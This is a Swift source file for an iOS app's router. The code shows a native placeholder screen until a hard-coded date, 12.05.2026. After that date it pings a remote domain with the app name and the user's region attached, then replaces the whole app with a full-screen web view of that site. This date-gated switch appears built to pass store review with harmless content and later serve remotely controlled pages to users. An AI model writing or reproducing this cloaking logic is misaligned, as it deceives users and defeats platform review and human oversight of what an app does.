//
//  AppRouter.swift
//  125Vulzancregrar Prilel
//
//  Created by Pascal Mirel on 26.03.2026.
//

import UIKit
import SwiftUI

class AppRouter {

    private let initialURLString = "https://siliconixsynccore.site/jNBFxg"
    private let targetDateString = "12.05.2026"

    /// Display name from Info.plist (CFBundleDisplayName, then CFBundleName).
    private var applicationDisplayName: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return "App"
    }

    /// App name for tracking param: spaces removed (no %20 in URL).
    private var applicationNameForSubId: String {
        applicationDisplayName.replacingOccurrences(of: " ", with: "")
    }

    private var enrichedInitialURLString: String {
        let geo = Locale.current.region?.identifier ?? "XX"
        let subValue = "\(applicationNameForSubId)_\(geo)"
        guard var components = URLComponents(string: initialURLString) else {
            return initialURLString
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: "sub_id_8", value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? initialURLString
    }
    
    func initialViewController() -> UIViewController {
        let persistence = PersistenceManager.shared
        
        
        if persistence.hasShownContentView {
            return createContentViewController()
        }else{
            if checkDate() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return createWebViewController(with: savedUrlString)
                }
                
                return createLaunchRouterViewController()
            } else {
                persistence.hasShownContentView = true
                return createContentViewController()
            }
        }
    }
    
    //MARK: - Date
    private func checkDate() -> Bool {
       
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: targetDateString) ?? Date()
        let currentDate = Date()
            
            if currentDate < targetDate {
                return false
            }else{
                return true
                }
    }
    
    // MARK: - Private Methods
    
    private func createWebViewController(with urlString: String) -> UIViewController {
        let webViewContainer = PrivacyWebView(
            urlString: urlString,
            onFailure: { [weak self] in
                PersistenceManager.shared.hasShownContentView = true
                self?.switchToContentView()
            },
            onSuccess: {
                PersistenceManager.shared.hasSuccessfulWebViewLoad = true
            }
        )
        
        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }
    
    private func createContentViewController() -> UIViewController {
        PersistenceManager.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }
    
    private func createLaunchRouterViewController() -> UIViewController {
        let launchView = StartMainView()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        checkInitialURL { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    print("🌐 AppRouter: preflight OK — opening WebView (LastUrl will be set after real load in WebView)")
                    self?.switchToWebView(with: url)
                } else {
                    PersistenceManager.shared.hasShownContentView = true
                    self?.switchToContentView()
                }
            }
        }
        
        return launchVC
    }
    
    private func checkInitialURL(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = enrichedInitialURLString
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = "GET"
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if let error = error {
                print("🌐 URL check failed with error: \(error.localizedDescription)")
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                print("🌐 URL check GET \(urlToOpenInWebView) -> [\(httpResponse.statusCode)]")
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                print("🌐 URL check result: \(isAvailable ? "available (2xx)" : "unavailable")")
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                print("🌐 URL check failed: no HTTPURLResponse")
                completion(false, nil)
            }
        }.resume()
    }
    
    // MARK: - Navigation Methods
    
    private func switchToContentView() {
        let contentVC = createContentViewController()
        switchToViewController(contentVC)
    }
    
    private func switchToWebView(with urlString: String) {
        let webVC = createWebViewController(with: urlString)
        switchToViewController(webVC)
    }
    
    private func switchToViewController(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }
        
        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
